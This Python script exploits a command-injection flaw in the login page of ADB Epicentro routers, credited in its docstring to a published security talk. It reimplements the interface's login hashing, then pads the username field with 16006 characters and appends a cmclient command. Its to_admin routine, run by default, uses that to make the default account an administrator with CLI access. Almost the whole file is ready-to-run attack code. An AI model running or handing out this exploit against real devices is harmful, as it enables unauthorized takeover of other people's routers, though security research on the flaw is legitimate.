#!/usr/bin/env python3

import hmac
import sys

import requests # requires requests
import passlib.hash # requires passlib
from bs4 import BeautifulSoup # requires beautifulsoup4



def do_login(session, login_url, username, password):
    """
    Logs into an ADB Epicentro webinterface. May need some modification to
    make it work with your model. Tested with A1 firmware E_3.0.11.
    """
    # Request the login page to get the nonce and code1-7
    login_page = session.get(login_url).text
    soup = BeautifulSoup(login_page, "html.parser")

    params = {
        "userName": username,
        "login": "Login",
        "language": "DE"
    }

    pwd_enc = password.encode("utf-8")

    nonce = soup.find("input", attrs={"name": "nonce"})["value"]
    nonce_enc = nonce.encode("ascii")
    params["nonce"] = nonce

    # Generate the password hmac. The only sane use of crypto in this entire
    # file.
    userpwd_hmac = hmac.new(key=nonce_enc, msg=pwd_enc, digestmod="sha256")
    params["userPwd"] = userpwd_hmac.hexdigest()

    # What's the point of all of this?
    for code_num in range(1, 8):
        code_name = "code{}".format(code_num)
        code_val = soup.find("input", attrs={"name": code_name})["value"]
        # Codes can be longer than 8 characters, but the hash function does not
        # support them. This is an implementation bug in the webinterface.
        salt = code_val[:8]
        md5_crypt = passlib.hash.md5_crypt.using(salt=salt)
        pwd_md5 = md5_crypt.hash(pwd_enc).encode("ascii")
        code_hmac = hmac.new(key=nonce_enc, msg=pwd_md5, digestmod="sha256")
        code_digest = code_hmac.hexdigest()
        params[code_name] = code_digest

    resp = session.post(login_url, data=params, allow_redirects=False)
    return resp

def inject(login_url, command):
    """
    Inject cmclient command using login page. Doesn't tell if it succeeded.

    Exploit discovered by Alain Mowat (@plopz0r) and shown in a talk titled
    "Reverse engineering Swisscom's Centro Grande modems".
    Slides: https://download.scrt.ch/cybsec16/chlam2308161-1_cybsec_swisscom.pdf
    """
    session = requests.Session()
    username = 16006 * 'a' + command + '\n'
    password = ""
    resp = do_login(session, login_url, username, password)
    resp.raise_for_status()

def to_admin(login_url):
    """
    Makes the default account admin.
    """
    inject(login_url, "SET Users.User.1.X_ADB_Role AdminUser")
    inject(login_url, "SET Users.User.1.X_ADB_CLIAccessCapable true")

def to_normal(login_url):
    """
    Makes the default account a regular user.
    """
    inject(login_url, "SET Users.User.1.X_ADB_Role NormalUser")
    inject(login_url, "SET Users.User.1.X_ADB_CLIAccessCapable false")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} <login url>")
        print("Example: {} 'http://10.0.0.138/ui/login'")
        exit(1)

    login_url = sys.argv[1]
    to_admin(login_url)
